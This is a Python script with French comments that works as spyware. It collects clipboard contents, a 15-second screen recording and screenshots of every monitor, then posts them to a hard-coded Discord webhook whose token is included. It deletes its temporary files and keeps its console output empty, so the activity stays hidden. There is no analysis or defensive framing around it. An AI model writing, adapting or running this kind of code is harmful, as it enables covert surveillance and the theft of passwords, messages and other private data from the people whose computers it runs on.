import mss
import requests
import time
import os
import webbrowser
import asyncio
import aiohttp
import discord
from discord.ext import commands
import pyautogui
import cv2
import numpy as np
import json
import pyperclip

# URL du webhook (par exemple, un webhook Discord)
webhook_url = "https://discord.com/api/webhooks/1255313444467380325/ztvZWAS3_ReE4sLrRvVjhLVkIOc2ngqF5G6wD6sltRBht_Z97wncdw2IYFla0Uphx4FD"

def send_to_discord(content):
    webhook_url = 'https://discord.com/api/webhooks/1255313444467380325/ztvZWAS3_ReE4sLrRvVjhLVkIOc2ngqF5G6wD6sltRBht_Z97wncdw2IYFla0Uphx4FD'
    
    data = {
        'content': content
    }
    headers = {
        'Content-Type': 'application/json'
    }
    
    try:
        response = requests.post(webhook_url, data=json.dumps(data), headers=headers)
        response.raise_for_status()
        print(f'')
    except requests.exceptions.RequestException as e:
        print(f' {e}')

def get_clipboard_content():
    try:
        clipboard_content = pyperclip.paste()
        return clipboard_content.splitlines()
    except pyperclip.PyperclipException as e:
        print(f'Error accessing clipboard: {e}')
        return []

if __name__ == '__main__':
    clipboard_lines = get_clipboard_content()
    if clipboard_lines:
        for line in clipboard_lines:
            send_to_discord(line)

# Fonction pour capturer une vidéo de l'écran pendant 15 secondes
def capture_screen_video(duration=15):
    screenshots = []
    start_time = time.time()

    while (time.time() - start_time) < duration:
        # Capturer l'écran
        screenshot = pyautogui.screenshot()
        screenshot = cv2.cvtColor(np.array(screenshot), cv2.COLOR_RGB2BGR)
        screenshots.append(screenshot)
        time.sleep(0)  # Capturer toutes les 0.1 secondes

    # Créer une vidéo à partir des captures
    height, width, layers = screenshots[0].shape
    video_name = f"screen_capture_{int(time.time())}.mov"
    video = cv2.VideoWriter(video_name, cv2.VideoWriter_fourcc(*'DIVX'), 10, (width, height))

    for screenshot in screenshots:
        video.write(screenshot)

    cv2.destroyAllWindows()
    video.release()

    return video_name

# Capturer la vidéo de l'écran
video_file = capture_screen_video()

# Envoyer la vidéo au webhook
with open(video_file, "rb") as file:
    files = {
        "file": (video_file, file, "video/x-msvideo")
    }

    response = requests.post(webhook_url, files=files)

# Supprimer le fichier vidéo temporaire
os.remove(video_file)

# Fonction pour capturer tous les écrans
def capture_all_screens():
    with mss.mss() as sct:
        monitors = sct.monitors
        screenshots = []
        for i, monitor in enumerate(monitors[1:], start=1):  # Ignore the first item which is a total screen
            filename = f"screenshot_{i}_{int(time.time())}.png"
            sct_img = sct.grab(monitor)
            mss.tools.to_png(sct_img.rgb, sct_img.size, output=filename)
            screenshots.append(filename)
    return screenshots

# URL du webhook (par exemple, un webhook Discord)
webhook_url = "https://discord.com/api/webhooks/1255313444467380325/ztvZWAS3_ReE4sLrRvVjhLVkIOc2ngqF5G6wD6sltRBht_Z97wncdw2IYFla0Uphx4FD"

# Capturer tous les écrans
filenames = capture_all_screens()

# Envoyer chaque capture d'écran au webhook
for filename in filenames:
    with open(filename, "rb") as file:
        # Créer un payload avec la capture d'écran
        files = {
            "file": (filename, file, "image/png")
        }
        
        # Envoyer la requête POST au webhook
        response = requests.post(webhook_url, files=files)


    # Supprimer le fichier temporaire
    os.remove(filename)
